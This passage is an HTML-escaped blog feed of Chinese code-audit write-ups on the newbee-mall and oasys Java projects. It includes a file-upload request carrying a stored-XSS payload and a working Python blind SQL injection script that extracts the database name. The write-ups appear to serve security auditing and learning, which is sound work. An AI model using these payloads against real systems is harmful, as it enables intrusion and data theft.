+&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="w"> &lt;/span>&lt;span class="n">Result&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="n">resultSuccess&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="o">=&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="n">ResultGenerator&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="na">genSuccessResult&lt;/span>&lt;span class="p">();&lt;/span>&lt;span class="w">
+&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="w"> &lt;/span>&lt;span class="n">resultSuccess&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="na">setData&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="n">NewBeeMallUtils&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="na">getHost&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="k">new&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="n">URI&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="n">httpServletRequest&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="na">getRequestURL&lt;/span>&lt;span class="p">()&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="o">+&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="s">&amp;#34;&amp;#34;&lt;/span>&lt;span class="p">))&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="o">+&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="s">&amp;#34;/upload/&amp;#34;&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="o">+&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="n">newFileName&lt;/span>&lt;span class="p">);&lt;/span>&lt;span class="w">
+&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="w"> &lt;/span>&lt;span class="k">return&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="n">resultSuccess&lt;/span>&lt;span class="p">;&lt;/span>&lt;span class="w">
+&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="w"> &lt;/span>&lt;span class="p">}&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="k">catch&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="n">IOException&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="n">e&lt;/span>&lt;span class="p">)&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="p">{&lt;/span>&lt;span class="w">
+&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="w"> &lt;/span>&lt;span class="n">e&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="na">printStackTrace&lt;/span>&lt;span class="p">();&lt;/span>&lt;span class="w">
+&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="w"> &lt;/span>&lt;span class="k">return&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="n">ResultGenerator&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="na">genFailResult&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="s">&amp;#34;文件上传失败&amp;#34;&lt;/span>&lt;span class="p">);&lt;/span>&lt;span class="w">
+&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="w"> &lt;/span>&lt;span class="p">}&lt;/span>&lt;span class="w">
+&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="w"> &lt;/span>&lt;span class="p">}&lt;/span>&lt;span class="w">
+&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="w">
+&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="w">&lt;/span>&lt;span class="p">}&lt;/span>&lt;span class="w">
+&lt;/span>&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
+&lt;/div>
+&lt;/div>&lt;p>​ 这里的代码在文件上传后又修改了文件的名字，所以无法进行目录穿透。但是并没有对文件后缀进行校验，也就是说存在任意文件上传，但是由于该项目不解析JSP所以进行getshell，但是我们可以尝试传一个html进行XSS攻击。&lt;/p>
+&lt;p>​ 我们创建一个文本，内部嵌入XSSpayload，并修改为png进行上传，抓包后修改后缀提交，如下：&lt;/p>
+&lt;div class="highlight">&lt;div class="chroma">
+&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
+&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt"> 1
+&lt;/span>&lt;span class="lnt"> 2
+&lt;/span>&lt;span class="lnt"> 3
+&lt;/span>&lt;span class="lnt"> 4
+&lt;/span>&lt;span class="lnt"> 5
+&lt;/span>&lt;span class="lnt"> 6
+&lt;/span>&lt;span class="lnt"> 7
+&lt;/span>&lt;span class="lnt"> 8
+&lt;/span>&lt;span class="lnt"> 9
+&lt;/span>&lt;span class="lnt">10
+&lt;/span>&lt;span class="lnt">11
+&lt;/span>&lt;span class="lnt">12
+&lt;/span>&lt;span class="lnt">13
+&lt;/span>&lt;span class="lnt">14
+&lt;/span>&lt;span class="lnt">15
+&lt;/span>&lt;span class="lnt">16
+&lt;/span>&lt;span class="lnt">17
+&lt;/span>&lt;span class="lnt">18
+&lt;/span>&lt;span class="lnt">19
+&lt;/span>&lt;span class="lnt">20
+&lt;/span>&lt;span class="lnt">21
+&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
+&lt;td class="lntd">
+&lt;pre tabindex="0" class="chroma">&lt;code class="language-http" data-lang="http">&lt;span class="line">&lt;span class="cl">&lt;span class="nf">POST&lt;/span> &lt;span class="nn">/admin/upload/file&lt;/span> &lt;span class="kr">HTTP&lt;/span>&lt;span class="o">/&lt;/span>&lt;span class="m">1.1&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="n">Host&lt;/span>&lt;span class="o">:&lt;/span> &lt;span class="l">172.21.80.85:8888&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="n">Content-Length&lt;/span>&lt;span class="o">:&lt;/span> &lt;span class="l">206&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="n">Cache-Control&lt;/span>&lt;span class="o">:&lt;/span> &lt;span class="l">max-age=0&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="n">Origin&lt;/span>&lt;span class="o">:&lt;/span> &lt;span class="l">http://172.21.80.85:8888&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="n">Content-Type&lt;/span>&lt;span class="o">:&lt;/span> &lt;span class="l">multipart/form-data; boundary=----WebKitFormBoundaryQaWx03yAmO19jNCn&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="n">Upgrade-Insecure-Requests&lt;/span>&lt;span class="o">:&lt;/span> &lt;span class="l">1&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="n">User-Agent&lt;/span>&lt;span class="o">:&lt;/span> &lt;span class="l">Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.0.0 Safari/537.36 Edg/131.0.0.0&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="n">Accept&lt;/span>&lt;span class="o">:&lt;/span> &lt;span class="l">text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="n">Referer&lt;/span>&lt;span class="o">:&lt;/span> &lt;span class="l">http://172.21.80.85:8888/admin/carousels&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="n">Accept-Encoding&lt;/span>&lt;span class="o">:&lt;/span> &lt;span class="l">gzip, deflate&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="n">Accept-Language&lt;/span>&lt;span class="o">:&lt;/span> &lt;span class="l">zh-CN,zh;q=0.9,en;q=0.8,en-GB;q=0.7,en-US;q=0.6&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="n">Cookie&lt;/span>&lt;span class="o">:&lt;/span> &lt;span class="l">JSESSIONID=CECCAACA0B3830B58F86BAF491DD38A5&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="n">Connection&lt;/span>&lt;span class="o">:&lt;/span> &lt;span class="l">close&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">------WebKitFormBoundaryQaWx03yAmO19jNCn
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">Content-Disposition: form-data; name=&amp;#34;file&amp;#34;; filename=&amp;#34;XSS.html&amp;#34;
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">Content-Type: image/png
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&amp;lt;script&amp;gt;alert(1)&amp;lt;/script&amp;gt;
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">------WebKitFormBoundaryQaWx03yAmO19jNCn--
+&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
+&lt;/div>
+&lt;/div>&lt;p>​ 得到返回包中的URL后访问：&lt;/p>
+&lt;p>&lt;img src="https://hadagaga.github.io/p/newbee-mall/image-20241125201120054.png"
+width="1210"
+height="363"
+srcset="https://hadagaga.github.io/p/newbee-mall/image-20241125201120054_hu15956773672354446620.png 480w, https://hadagaga.github.io/p/newbee-mall/image-20241125201120054_hu8261831634851849922.png 1024w"
+loading="lazy"
+alt="image-20241125201120054"
+class="gallery-image"
+data-flex-grow="333"
+data-flex-basis="800px"
+>&lt;/p>
+&lt;h2 id="前端渗透测试">前端渗透测试
+&lt;/h2>&lt;h3 id="xss">XSS
+&lt;/h3>&lt;p>​ 经过测试发现该项目多处，如：轮播图，热销商品等多处均存在XSS漏洞。且多为存储型XSS，但是由于是POST传参，所以利用难度较大。&lt;/p></description></item><item><title>oasys-1</title><link>https://hadagaga.github.io/p/oasys-1/</link><pubDate>Fri, 22 Nov 2024 00:00:00 +0000</pubDate><guid>https://hadagaga.github.io/p/oasys-1/</guid><description>&lt;img src="https://hadagaga.github.io/p/oasys-1/cover.png" alt="Featured image of post oasys-1" />&lt;h2 id="项目技术栈">项目技术栈
+&lt;/h2>&lt;h4 id="前端">前端
+&lt;/h4>&lt;table>
+&lt;thead>
+&lt;tr>
+&lt;th>技术&lt;/th>
+&lt;th>名称&lt;/th>
+&lt;th>版本&lt;/th>
+&lt;th>官网&lt;/th>
+&lt;/tr>
+&lt;/thead>
+&lt;tbody>
+&lt;tr>
+&lt;td>freemarker&lt;/td>
+&lt;td>模板引擎&lt;/td>
+&lt;td>springboot1.5.6.RELEASE集成版本&lt;/td>
+&lt;td>&lt;a class="link" href="https://freemarker.apache.org/" target="_blank" rel="noopener"
+>https://freemarker.apache.org/&lt;/a>&lt;/td>
+&lt;/tr>
+&lt;tr>
+&lt;td>Bootstrap&lt;/td>
+&lt;td>前端UI框架&lt;/td>
+&lt;td>3.3.7&lt;/td>
+&lt;td>&lt;a class="link" href="http://www.bootcss.com/" target="_blank" rel="noopener"
+>http://www.bootcss.com/&lt;/a>&lt;/td>
+&lt;/tr>
+&lt;tr>
+&lt;td>Jquery&lt;/td>
+&lt;td>快速的JavaScript框架&lt;/td>
+&lt;td>1.11.3&lt;/td>
+&lt;td>&lt;a class="link" href="https://jquery.com/" target="_blank" rel="noopener"
+>https://jquery.com/&lt;/a>&lt;/td>
+&lt;/tr>
+&lt;tr>
+&lt;td>kindeditor&lt;/td>
+&lt;td>HTML可视化编辑器&lt;/td>
+&lt;td>4.1.10&lt;/td>
+&lt;td>&lt;a class="link" href="http://kindeditor.net/" target="_blank" rel="noopener"
+>http://kindeditor.net&lt;/a>&lt;/td>
+&lt;/tr>
+&lt;tr>
+&lt;td>My97 DatePicker&lt;/td>
+&lt;td>时间选择器&lt;/td>
+&lt;td>4.8 Beta4&lt;/td>
+&lt;td>&lt;a class="link" href="http://www.my97.net/" target="_blank" rel="noopener"
+>http://www.my97.net/&lt;/a>&lt;/td>
+&lt;/tr>
+&lt;/tbody>
+&lt;/table>
+&lt;h4 id="后端">后端
+&lt;/h4>&lt;table>
+&lt;thead>
+&lt;tr>
+&lt;th>技术&lt;/th>
+&lt;th>名称&lt;/th>
+&lt;th>版本&lt;/th>
+&lt;th>官网&lt;/th>
+&lt;/tr>
+&lt;/thead>
+&lt;tbody>
+&lt;tr>
+&lt;td>SpringBoot&lt;/td>
+&lt;td>SpringBoot框架&lt;/td>
+&lt;td>1.5.6.RELEASE&lt;/td>
+&lt;td>&lt;a class="link" href="https://spring.io/projects/spring-boot" target="_blank" rel="noopener"
+>https://spring.io/projects/spring-boot&lt;/a>&lt;/td>
+&lt;/tr>
+&lt;tr>
+&lt;td>JPA&lt;/td>
+&lt;td>spring-data-jpa&lt;/td>
+&lt;td>1.5.6.RELEASE&lt;/td>
+&lt;td>&lt;a class="link" href="https://projects.spring.io/spring-data-jpa" target="_blank" rel="noopener"
+>https://projects.spring.io/spring-data-jpa&lt;/a>&lt;/td>
+&lt;/tr>
+&lt;tr>
+&lt;td>Mybatis&lt;/td>
+&lt;td>Mybatis框架&lt;/td>
+&lt;td>1.3.0&lt;/td>
+&lt;td>&lt;a class="link" href="http://www.mybatis.org/mybatis-3" target="_blank" rel="noopener"
+>http://www.mybatis.org/mybatis-3&lt;/a>&lt;/td>
+&lt;/tr>
+&lt;tr>
+&lt;td>fastjson&lt;/td>
+&lt;td>json解析包&lt;/td>
+&lt;td>1.2.36&lt;/td>
+&lt;td>&lt;a class="link" href="https://github.com/alibaba/fastjson" target="_blank" rel="noopener"
+>https://github.com/alibaba/fastjson&lt;/a>&lt;/td>
+&lt;/tr>
+&lt;tr>
+&lt;td>pagehelper&lt;/td>
+&lt;td>Mybatis分页插件&lt;/td>
+&lt;td>1.0.0&lt;/td>
+&lt;td>&lt;a class="link" href="https://pagehelper.github.io/" target="_blank" rel="noopener"
+>https://pagehelper.github.io&lt;/a>&lt;/td>
+&lt;/tr>
+&lt;/tbody>
+&lt;/table>
+&lt;h2 id="一项目依赖审计">一、项目依赖审计
+&lt;/h2>&lt;p>​ 1、springframework命令执行漏洞（失败）&lt;/p>
+&lt;div class="highlight">&lt;div class="chroma">
+&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
+&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt">1
+&lt;/span>&lt;span class="lnt">2
+&lt;/span>&lt;span class="lnt">3
+&lt;/span>&lt;span class="lnt">4
+&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
+&lt;td class="lntd">
+&lt;pre tabindex="0" class="chroma">&lt;code class="language-xml" data-lang="xml">&lt;span class="line">&lt;span class="cl">&lt;span class="nt">&amp;lt;dependency&amp;gt;&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="nt">&amp;lt;groupId&amp;gt;&lt;/span>org.springframework.boot&lt;span class="nt">&amp;lt;/groupId&amp;gt;&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="nt">&amp;lt;artifactId&amp;gt;&lt;/span>spring-boot-starter-web&lt;span class="nt">&amp;lt;/artifactId&amp;gt;&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="nt">&amp;lt;/dependency&amp;gt;&lt;/span>
+&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
+&lt;/div>
+&lt;/div>&lt;p>​ 该依赖存在命令执行漏洞，但是不具备利用条件&lt;/p>
+&lt;h2 id="二单点漏洞审计">二、单点漏洞审计
+&lt;/h2>&lt;h3 id="1sql注入">1、SQL注入
+&lt;/h3>&lt;p>​ 在全局搜索中搜索${，发现有如下文件中的SQL语句使用$&lt;/p>
+&lt;p>​ &lt;img src="https://hadagaga.github.io/p/oasys-1/1.png"
+width="997"
+height="432"
+srcset="https://hadagaga.github.io/p/oasys-1/1_hu12445189562718688719.png 480w, https://hadagaga.github.io/p/oasys-1/1_hu15958288584684244725.png 1024w"
+loading="lazy"
+alt="img"
+class="gallery-image"
+data-flex-grow="230"
+data-flex-basis="553px"
+>&lt;/p>
+&lt;h4 id="address-mapperxml">address-mapper.xml
+&lt;/h4>&lt;p>​ 语句如下：&lt;/p>
+&lt;p>&lt;img src="https://hadagaga.github.io/p/oasys-1/2.png"
+width="979"
+height="732"
+srcset="https://hadagaga.github.io/p/oasys-1/2_hu9668524567578666620.png 480w, https://hadagaga.github.io/p/oasys-1/2_hu8539387390401036069.png 1024w"
+loading="lazy"
+alt="img"
+class="gallery-image"
+data-flex-grow="133"
+data-flex-basis="320px"
+>&lt;/p>
+&lt;p>​ 我们发现这里有多个参数都使用了$，向上追溯：&lt;/p>
+&lt;p>&lt;img src="https://hadagaga.github.io/p/oasys-1/3.png"
+width="1235"
+height="335"
+srcset="https://hadagaga.github.io/p/oasys-1/3_hu1009320479793636510.png 480w, https://hadagaga.github.io/p/oasys-1/3_hu5075154656646095766.png 1024w"
+loading="lazy"
+alt="img"
+class="gallery-image"
+data-flex-grow="368"
+data-flex-basis="884px"
+>&lt;/p>
+&lt;p>​ 发现在路由outaddresspaging调用了该方法&lt;/p>
+&lt;p>​ 根据功能点，定位到前端的外部通讯录。&lt;/p>
+&lt;h5 id="alph">alph
+&lt;/h5>&lt;p>​ 通过审计我们可以发现，pinyin就是alph，经过测试我们可以确认alph参数存在SQL注入，具体流程如下：&lt;/p>
+&lt;p>​ 我们先创建一个名字为A的外部联系人&lt;/p>
+&lt;p>如下：&lt;/p>
+&lt;p>&lt;img src="https://hadagaga.github.io/p/oasys-1/4.png"
+width="1065"
+height="628"
+srcset="https://hadagaga.github.io/p/oasys-1/4_hu16325196121791765875.png 480w, https://hadagaga.github.io/p/oasys-1/4_hu15814447044000996359.png 1024w"
+loading="lazy"
+alt="img"
+class="gallery-image"
+data-flex-grow="169"
+data-flex-basis="407px"
+>&lt;/p>
+&lt;p>​ 这一步是为了让like有数据，这样我们才能执行后面的语句。根据测试我们发现可以进行SQL盲注，因此我们有如下的python脚本：&lt;/p>
+&lt;div class="highlight">&lt;div class="chroma">
+&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
+&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt"> 1
+&lt;/span>&lt;span class="lnt"> 2
+&lt;/span>&lt;span class="lnt"> 3
+&lt;/span>&lt;span class="lnt"> 4
+&lt;/span>&lt;span class="lnt"> 5
+&lt;/span>&lt;span class="lnt"> 6
+&lt;/span>&lt;span class="lnt"> 7
+&lt;/span>&lt;span class="lnt"> 8
+&lt;/span>&lt;span class="lnt"> 9
+&lt;/span>&lt;span class="lnt">10
+&lt;/span>&lt;span class="lnt">11
+&lt;/span>&lt;span class="lnt">12
+&lt;/span>&lt;span class="lnt">13
+&lt;/span>&lt;span class="lnt">14
+&lt;/span>&lt;span class="lnt">15
+&lt;/span>&lt;span class="lnt">16
+&lt;/span>&lt;span class="lnt">17
+&lt;/span>&lt;span class="lnt">18
+&lt;/span>&lt;span class="lnt">19
+&lt;/span>&lt;span class="lnt">20
+&lt;/span>&lt;span class="lnt">21
+&lt;/span>&lt;span class="lnt">22
+&lt;/span>&lt;span class="lnt">23
+&lt;/span>&lt;span class="lnt">24
+&lt;/span>&lt;span class="lnt">25
+&lt;/span>&lt;span class="lnt">26
+&lt;/span>&lt;span class="lnt">27
+&lt;/span>&lt;span class="lnt">28
+&lt;/span>&lt;span class="lnt">29
+&lt;/span>&lt;span class="lnt">30
+&lt;/span>&lt;span class="lnt">31
+&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
+&lt;td class="lntd">
+&lt;pre tabindex="0" class="chroma">&lt;code class="language-python" data-lang="python">&lt;span class="line">&lt;span class="cl">&lt;span class="kn">import&lt;/span> &lt;span class="nn">requests&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="k">def&lt;/span> &lt;span class="nf">send_post_request&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="n">url&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="n">false_len&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="n">cookies&lt;/span>&lt;span class="o">=&lt;/span>&lt;span class="kc">None&lt;/span> &lt;span class="p">):&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="k">for&lt;/span> &lt;span class="n">i&lt;/span> &lt;span class="ow">in&lt;/span> &lt;span class="nb">range&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="mi">1&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="mi">6&lt;/span>&lt;span class="p">):&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="k">for&lt;/span> &lt;span class="n">k&lt;/span> &lt;span class="ow">in&lt;/span> &lt;span class="nb">range&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="mi">33&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="mi">127&lt;/span>&lt;span class="p">):&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="n">data&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="p">{&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="s2">&amp;#34;alph&amp;#34;&lt;/span>&lt;span class="p">:&lt;/span> &lt;span class="sa">f&lt;/span>&lt;span class="s2">&amp;#34;A&lt;/span>&lt;span class="se">\&amp;#39;&lt;/span>&lt;span class="s2">and ascii(substr(database(),&lt;/span>&lt;span class="si">{&lt;/span>&lt;span class="n">i&lt;/span>&lt;span class="si">}&lt;/span>&lt;span class="s2">,1))=&lt;/span>&lt;span class="si">{&lt;/span>&lt;span class="n">k&lt;/span>&lt;span class="si">}&lt;/span>&lt;span class="s2">--+qwe&amp;#34;&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="p">}&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="c1">#print(data)&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="n">response&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="n">requests&lt;/span>&lt;span class="o">.&lt;/span>&lt;span class="n">post&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="n">url&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="n">data&lt;/span>&lt;span class="o">=&lt;/span>&lt;span class="n">data&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="n">cookies&lt;/span>&lt;span class="o">=&lt;/span>&lt;span class="n">cookies&lt;/span>&lt;span class="p">)&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="c1">#print(len(response.text))&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="k">if&lt;/span> &lt;span class="nb">len&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="n">response&lt;/span>&lt;span class="o">.&lt;/span>&lt;span class="n">text&lt;/span>&lt;span class="p">)&lt;/span> &lt;span class="o">!=&lt;/span> &lt;span class="n">false_len&lt;/span>&lt;span class="p">:&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="nb">print&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="sa">f&lt;/span>&lt;span class="s2">&amp;#34;&lt;/span>&lt;span class="si">{&lt;/span>&lt;span class="nb">chr&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="n">k&lt;/span>&lt;span class="p">)&lt;/span>&lt;span class="si">}&lt;/span>&lt;span class="s2">&amp;#34;&lt;/span> &lt;span class="p">,&lt;/span> &lt;span class="n">end&lt;/span>&lt;span class="o">=&lt;/span>&lt;span class="s1">&amp;#39;&amp;#39;&lt;/span>&lt;span class="p">)&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="k">break&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="k">else&lt;/span>&lt;span class="p">:&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="k">pass&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="k">if&lt;/span> &lt;span class="vm">__name__&lt;/span> &lt;span class="o">==&lt;/span> &lt;span class="s2">&amp;#34;__main__&amp;#34;&lt;/span>&lt;span class="p">:&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="c1"># 设置请求的URL&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="n">url&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="s2">&amp;#34;http://172.21.46.127:8888/outaddresspaging&amp;#34;&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="c1"># 设置请求的Cookie&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="n">cookies&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="p">{&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="s2">&amp;#34;JSESSIONID&amp;#34;&lt;/span>&lt;span class="p">:&lt;/span> &lt;span class="s2">&amp;#34;1E514058317178F919F2084D177556DE&amp;#34;&lt;/span>&lt;span class="p">,&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="p">}&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="n">data&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="p">{&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="s2">&amp;#34;alph&amp;#34;&lt;/span>&lt;span class="p">:&lt;/span> &lt;span class="s2">&amp;#34;A&amp;#39;and ascii(substr(database(),1,1))=1--+qwe&amp;#34;&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="p">}&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="c1">#print(data)&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="n">respond&lt;/span>&lt;span class="o">=&lt;/span>&lt;span class="n">requests&lt;/span>&lt;span class="o">.&lt;/span>&lt;span class="n">post&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="n">url&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="n">data&lt;/span>&lt;span class="o">=&lt;/span>&lt;span class="n">data&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="n">cookies&lt;/span>&lt;span class="o">=&lt;/span>&lt;span class="n">cookies&lt;/span>&lt;span class="p">)&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="n">false_len&lt;/span>&lt;span class="o">=&lt;/span>&lt;span class="nb">len&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="n">respond&lt;/span>&lt;span class="o">.&lt;/span>&lt;span class="n">text&lt;/span>&lt;span class="p">)&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="c1">#print(false_len)&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="c1"># 发送POST请求&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="n">send_post_request&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="n">url&lt;/span> &lt;span class="p">,&lt;/span> &lt;span class="n">false_len&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="n">cookies&lt;/span>&lt;span class="p">)&lt;/span>
+&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
+&lt;/div>
+&lt;/div>&lt;p>​ 我们可以成功的爆出库名&lt;/p>
+&lt;p>&lt;img src="https://hadagaga.github.io/p/oasys-1/5.png"
+width="566"
+height="61"
+srcset="https://hadagaga.github.io/p/oasys-1/5_hu236233804755081951.png 480w, https://hadagaga.github.io/p/oasys-1/5_hu5358036775795155964.png 1024w"
+loading="lazy"
+alt="img"
+class="gallery-image"
+data-flex-grow="927"
+data-flex-basis="2226px"
+>&lt;/p>
+&lt;h5 id="outtype">outtype
+&lt;/h5>&lt;p>​ 对于这个参数，注入方式与第一个参数相同，payload如下&lt;/p>
+&lt;div class="highlight">&lt;div class="chroma">
+&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
+&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt">1
+&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
+&lt;td class="lntd">
